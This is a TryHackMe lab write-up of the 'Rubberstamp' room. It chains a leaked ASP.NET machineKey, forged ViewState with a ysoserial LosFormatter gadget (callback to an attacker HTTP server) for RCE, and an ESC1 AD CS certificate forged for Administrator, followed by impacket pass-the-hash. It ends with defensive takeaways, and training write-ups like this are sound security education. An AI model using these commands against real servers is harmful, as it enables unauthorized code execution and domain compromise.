# Rubberstamp — TryHackMe Write-up

> **BLUF:** An exposed `global.asax.bak` disclosed the ASP.NET `machineKey`. I used it to forge an encrypted ASP.NET ViewState payload, obtained RCE as `rubberstamp\svc-iisweb`, found the user flag, then abused an ESC1 AD CS template to authenticate as `Administrator` and retrieve the root flag. Secrets, hashes, and flags are intentionally omitted.

Room: [TryHackMe — Rubberstamp](https://tryhackme.com/room/rubberstamp)

## Reconnaissance

Initial service enumeration identified IIS, ASP.NET, LDAP, Kerberos, and SMB:

```bash
nmap -sC -sV -p- 10.65.150.148
```

The application exposed a legacy Web Forms page:

```text
/legacy/RequestStatus.aspx?id=1
```

The page returned:

- `__VIEWSTATE`
- `__VIEWSTATEGENERATOR=0CA456E0`

## Machine-key disclosure

A backup file was publicly accessible:

```text
/global.asax.bak
```

The source showed that requests to the legacy path with `debug=true` returned exception details and the configured machine-key values.

The keys were stored locally as environment variables and are not included in this write-up.

## Forging protected ViewState

The target used ASP.NET Framework 4.5-style ViewState protection. The relevant purpose values were:

```text
WebForms.HiddenFieldPageStatePersister.ClientState
TemplateSourceDirectory: /LEGACY
Type: LEGACY_REQUESTSTATUS_ASPX
```

The forged ViewState required:

1. A LosFormatter gadget payload.
2. SP800-108/HMAC-SHA512 key derivation.
3. AES-CBC encryption.
4. HMAC-SHA1 over the IV and ciphertext.
5. Base64 encoding.

The generated payload was submitted as:

```python
requests.post(
    target,
    data={
        "__VIEWSTATE": forged_viewstate,
        "__VIEWSTATEGENERATOR": "0CA456E0",
        "__VIEWSTATEENCRYPTED": "",
    },
    allow_redirects=False,
)
```

A benign protected ViewState returned `200`, confirming that the cryptographic framing was correct.

## Proof of concept: RCE

A LosFormatter gadget was generated locally:

```bash
/opt/metasploit-framework/embedded/bin/ruby \
  /opt/metasploit-framework/embedded/framework/tools/payloads/ysoserial/dot_net.rb \
  -c 'powershell -NoProfile -EncodedCommand <BASE64_COMMAND>' \
  -f LosFormatter \
  -g TypeConfuseDelegate \
  -o base64 \
  > /tmp/unsigned_payload.txt
```

The payload was then protected using the custom ViewState signer and submitted to the legacy page.

To confirm execution, the command caused the target to request a URL hosted by the AttackBox:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

The callback confirmed execution as:

```text
rubberstamp\svc-iisweb
```

## User flag

The service account could read:

```text
C:\Users\Public\user.txt
```

The flag value is omitted.

## AD enumeration

The service account was a normal domain user but had a machine-account quota available:

```text
MachineAccountQuota = 10
```

A controlled computer account was created in Active Directory. Its password is intentionally omitted:

```powershell
New-ADComputer -Name "RB01" `
  -SamAccountName "RB01$" `
  -Path "CN=Computers,DC=rubberstamp,DC=local" `
  -AccountPassword $Password `
  -Enabled $true
```

## AD CS enumeration

Certificate Services was present:

```text
CA: rubberstamp-SRV01-CA
```

Certificate template enumeration identified:

```text
PrivClientAuth
```

The template was vulnerable because:

- Domain Users could enroll.
- Client authentication was enabled.
- The enrollee could supply the subject/SAN.
- Manager approval was not required.

This was an ESC1 misconfiguration.

## ESC1 exploitation

A CSR was generated with the UPN of the domain Administrator:

```bash
openssl req -newkey rsa:2048 -nodes \
  -keyout administrator.key \
  -out req.csr \
  -subj '/CN=Administrator' \
  -addext 'subjectAltName=otherName:1.3.6.1.4.1.311.20.2.3;UTF8:Administrator@rubberstamp.local'
```

The CSR was submitted using the service account’s current Windows token:

```powershell
certreq.exe -submit `
  -attrib "CertificateTemplate:PrivClientAuth" `
  -config "SRV01.rubberstamp.local\CA_NAME" `
  req.csr admin.cer
```

The issued certificate and private key were combined into a PFX. The PFX password is omitted.

Authentication with the certificate produced an Administrator Kerberos ticket and NTLM credential material. Those values are intentionally omitted.

## Root flag

Administrator access was verified remotely:

```bash
impacket-wmiexec \
  -hashes '<REDACTED_LM_HASH>:<REDACTED_NT_HASH>' \
  'rubberstamp.local/Administrator@10.65.150.148' \
  'type C:\Users\Administrator\Desktop\root.txt'
```

The root flag value is omitted.

## Key takeaways

- Do not expose backup source files such as `global.asax.bak`.
- Never disclose ASP.NET machine keys through debug responses.
- Use modern ASP.NET ViewState protection with correctly scoped purposes.
- Restrict AD CS enrollment permissions.
- Do not allow arbitrary subject/SAN values on client-authentication templates.
- Review certificate templates regularly for ESC1-style vulnerabilities.
